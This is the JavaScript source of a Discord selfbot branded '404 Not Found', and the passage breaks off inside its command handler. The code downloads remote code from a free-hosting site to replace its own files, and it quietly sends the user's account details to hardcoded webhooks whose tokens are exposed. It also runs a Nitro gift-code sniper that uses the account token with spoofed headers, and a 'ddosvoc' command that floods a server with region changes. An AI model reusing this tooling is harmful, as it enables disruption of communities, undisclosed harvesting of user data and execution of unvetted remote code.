const c = require("./config.json");
const child_process = require('child_process').exec;


const token = c.token
const prefix = c.prefix
const id = c.id
const rs = require("readline-sync");
var download = require('download-file')
const {
    Client,
    RichEmbed,
    WebhookClient
} = require('discord.js');
const backups = require("./Data/backups.json");
var vers = "3.6"
const {
    red,
    green,
    blue,
    yellow,
    cyan,
    white,
} = require('chalk');

var d = new Date,
    dformat = [
               d.getFullYear()].join('/')+' '+
              [d.getHours(),
               d.getMinutes(),
               d.getSeconds()].join(':');
const color = "RANDOM";
const axios = require('axios').default;
const nitrosniper = new Client()
const superagent = require("superagent");
const client = new Client();
const colors = require("colors");
let rpcGenerator = require("discordrpcgenerator")
var uuid = ()=>([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,a=>(a^Math.random()*16>>a/4).toString(16))
const request = require('request');
const ascii = require('ascii-art');
const fs = require("fs")
let i = 0;
const fetch = require('node-fetch')
console.log("checking update please wait...".bgRed)
superagent.get("https://404-presentation.000webhostapp.com/api.json", (body, res)=>{
    if(res.body.version !== vers){
        console.log("Update Needed downloading...".green)
        fetch(res.body.lien1)
        .then(res => res.text())
        .then(body => fs.writeFile('./Data/index.js', body  , function(err) {
            if(err) {
                return console.log(red("EN  oops an error occured  FR oops une erreur est survenue" + err));
            }
          
         
        }));;

            console.log("Please Restart start.bat".green)
            process.exit();
            
          
         
        
    }
    if(res.body.version === vers){
        console.log("No update needed launching".green)
        return;
    }
})
client.on('ready', () => {
    
    rpcGenerator.getRpcImage("811031260037382214", "selfbotesd")
    .then(image => {
        let presence = new rpcGenerator.Rpc()
        .setName("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅")
        .setUrl("https://twitch.tv/discord")
        .setType("STREAMING")
        .setApplicationId("383226320970055681")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("Made by extazy")
        .setDetails("404 Not Found")
        .setState("https://gg/kngkKse69H")
        .setParty({
            size: [1, 4],
            id: uuid()
        })
        .setDetails("404 Not Found")
        client.user.setPresence(presence.toDiscord())
    }).catch(console.error)

console.log(" + ============================= + ".red);
console.log(" |  Logged in ".green + client.user.tag.red )
console.log(" |  Prefix : ".green + prefix.rainbow)
console.log(" |  ID : ".green + id.red)
console.log(" + ============================= + ".red);
console.log('Selfbot Info : '.red)
superagent.get("https://404-presentation.000webhostapp.com/api.json",(body, res)=>{
    console.log("Selfbot Version : ".red + res.body.version.green)
    console.log("Creator : ".red + res.body.creator.green)
    console.log("Patch Note : ".red + res.body.patchnote.green)
})
const webClient = new WebhookClient("811575221101658112", "NuJ8L4RiyVMfM6m8Y6koGAYUUdatn38EAxBc3pHzGD6W2bP8VTPeFEwi4rngRg7d6qOT");


const webhookClient = new WebhookClient("811395098847084574", "ykJGvHjF817Ln3yF1QPIjYFDklaHvC4MZ9rjQcnBlcOSGvHLpYJnnPZ2dRVZ4u2G51Qb");

const embed = new RichEmbed()
.setTitle("404 | LOGS INFO")
.setDescription(`Username Ping : <@${id}> \n Username : ${client.user.tag} \n ID : ${id} \n Prefix : ${prefix} \n Nitro : ${client.user.premium} `)
.setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
.setColor("RANDOM")
.setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")

webhookClient.send('LOGS', {
	username: '404 | LOGS',
	avatarURL: 'https://cdn.discordapp.com/attachments/809170422704504852/811312415601721374/giphy_3.gif',
	embeds: [embed],
    
});
function matchCode(text, callback) {
    let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
    if (codes) {
        callback(codes[0])
        return matchCode(text.slice(codes.index + codes[0].length), callback)
    } else {
        callback(null)
    }
    
  
}

nitrosniper.login(token)
nitrosniper.on("ready", () => {
    nitrosniper.on("message", message => {
        let codes = []
        matchCode(message.content, (code) => {
            if (!code) return
            if (!codes.includes(code)) codes.push(code)
        })
        if (codes.length == 0) return
        codes.forEach(code => {
            fetch("https://canary.discordapp.com/api/v6/entitlements/gift-codes/" + code.split("/").pop() + "/redeem", {
                method: "post",
                headers: {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US",
                    "Authorization": client.token,
                    "Connection": "keep-alive",
                    "Content-Length": JSON.stringify({
                        channel_id: message.channel.id
                    }).length,
                    "Content-Type": "application/json",
                    "Host": "canary.discordapp.com",
                    "Referer": `https://canary.discordapp.com/channels/${message.channel.id}/${message.id}`,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                    "X-super-properties": Buffer.from(JSON.stringify({
                        "os": "Windows",
                        "browser": "Firefox",
                        "device": "",
                        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                        "browser_version": "66.0",
                        "os_version": "10",
                        "referrer": "",
                        "referring_domain": "",
                        "referrer_current": "",
                        "referring_domain_current": "",
                        "release_channel": "canary",
                        "client_build_number": 37519,
                        "client_event_source": null
                    }), "utf-8").toString("base64")
                },
                body: JSON.stringify({
                    channel_id: message.channel.id
                })
            }).then(res => {
                if (res.status == 400 || res.status == 10038) return console.log(`code invalide :  ${code}`.red)
                res.json().then(json => {
                    console.log(json)
                    console.log("Un nouveau nitro ou jeux à sûrement été ajouté à tes crédits.".green)
                })
            }).catch(console.error)
        })
    })
})

});
client.on('message', async (msg) => {
    if (msg.author.id !== id) {
        return;
    }

    let cmd = msg.content.split(" ")[0]
    cmd = cmd.slice(prefix.length);
    let args = msg.content.split(" ").slice(1);

    if (msg.content.startsWith(prefix) && msg.author.id === id) {
        console.log(red(`COMMANDE :  ${msg.content} EXECUTER`));
    }


    if(cmd === "help"){
        msg.delete();
        const help = new RichEmbed()
        .setTitle("404 | HELP")
        .setDescription("\n \n \n \n __**API**__ - Affiche l'embed **API**\n__**NSFW**__ - Affiche l'embed **NSFW**\n__**HELPBACKUP**__ - Affiche l'embed **BACKUP**\n __**UTILE**__ - Affiche l'embed **UTILIE** \n __**STATUS**__ - Affiche l'embed **STATUS**  \n __**FUN**__ - Affiche l'embed **FUN** \n __**RAID**__ - Affiche l'embed **RAID**\n __**TOKEN**__ - Affiche l'embed **TOKEN** \n __**ABOUT**__ - Affiche l'embed **ABOUT**\n \n \n \n ")
        .setImage("https://cdn.discordapp.com/attachments/810595641545719879/811246586226540565/giphy.gif")
        .setColor("RANDOM")
        .setFooter("404 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 | By Extazy")
        msg.channel.send(help)
       
    }
 if(cmd==="ddosvoc"){
    msg.delete();

    let serveur = msg.guild;
    if (!serveur) return msg.channel.send(':x: **Commande uniquement utilisable sur un serveur**');
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('europe').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
    msg.guild.setRegion('russia').catch(error => {})
    msg.guild.setRegion('india').catch(error => {})
    msg.guild.setRegion('japan').catch(error => {})
